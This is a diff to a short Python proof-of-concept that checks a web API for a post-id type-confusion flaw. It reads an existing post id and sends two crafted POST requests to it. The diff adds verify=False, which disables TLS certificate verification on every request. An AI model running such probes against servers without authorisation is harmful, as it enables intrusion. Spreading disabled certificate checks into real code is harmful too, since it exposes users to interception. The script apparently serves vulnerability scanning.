@@ -13,14 +13,14 @@ def poc(url):
     url = url if '://' in url else 'http://' + url
 
     try:
-        r = requests.get(url + API_ROUTE)
+        r = requests.get(url + API_ROUTE, verify=False)
         id = json.loads(r.content)[0]['id']  # get an exist post id
 
         post_url = url + API_ROUTE + str(id)
         data1 = '{"id": "%s"}' % id
         data2 = '{"id": "%sa"}' % id
-        r1 = requests.post(post_url, data1, headers={'Content-Type': 'application/json'})
-        r2 = requests.post(post_url, data2, headers={'Content-Type': 'application/json'})
+        r1 = requests.post(post_url, data1, headers={'Content-Type': 'application/json'}, verify=False)
+        r2 = requests.post(post_url, data2, headers={'Content-Type': 'application/json'}, verify=False)
 
         if r1.status_code > 400 and r2.status_code == 200 and r1.content != r2.content:
             return post_url
